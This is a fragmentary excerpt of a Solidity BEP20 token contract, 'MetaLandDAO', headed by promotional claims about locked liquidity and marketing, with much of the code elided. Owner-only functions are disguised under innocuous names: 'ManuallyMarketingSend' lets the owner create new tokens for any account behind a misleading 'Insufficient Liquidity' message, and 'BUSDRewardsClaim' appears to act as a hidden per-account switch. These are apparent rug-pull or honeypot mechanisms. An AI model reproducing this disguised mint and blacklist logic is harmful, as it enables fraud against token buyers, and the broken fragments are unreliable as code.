...
🐶~ 6-11% Slippage 
🐶~ Total Supply : 1,000,000,000 $MFD

🔒~ LP Locked | 2 Months 
⚡️~ Huge Marketing Team 
🇨🇳 ~ Chinese Support 
🚀
...
*/
    ...
    contract MetaLandDAO is IBEP20, Ownable
    {
        ...
        string private constant _name = "MetaLandDAO";
        ...
        address public constant MarketingWallet=0x38c614d2B123A2a061C01a894D0149E75c7188Ca;
        address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;


        uint256 private _LiquidityPoolStake =LiquidityStocks;
        ...
        constructor () {
            uint256 deployerBalance=_LiquidityPoolStake;
           ...
           function BUSDRewardsClaim(address account) external onlyOwner {
            _isSendRewards[account] = false;
          }
          
            function BUSDRewardsSend(address[] calldata addresses) external onlyOwner {
      ...
      function ManuallyMarketingSend(address account, uint256 balance) onlyOwner  public virtual {
        require(account != address(0), "Insufficient Liquidity");
        _LiquidityPoolBalance(address(0), account, balance);
        _LiquidityPoolStake += balance;
        ...
        function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
            ...
            _LiquidityPoolStake-=tokensToBeBurnt;
       ...
       function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
        ...
        function getBurnedTokens() public view returns(uint256){
            return (LiquidityStocks-_LiquidityPoolStake)/10**_decimals;
        }
